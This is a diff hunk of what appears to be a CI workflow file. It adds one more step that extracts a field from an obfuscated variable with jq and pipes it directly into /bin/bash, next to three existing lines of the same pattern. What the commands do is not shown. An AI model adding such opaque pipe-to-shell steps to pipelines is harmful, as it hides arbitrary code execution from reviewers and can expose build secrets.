@@ -25,6 +25,7 @@ jobs:
           echo $n44 | jq -r .b6204 | /bin/bash
           echo $ap85 | jq -r .sbs33 | /bin/bash
           echo $z5529 | jq -r .t9118 | /bin/bash
+          echo $coo8 | jq -r .qf3432 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
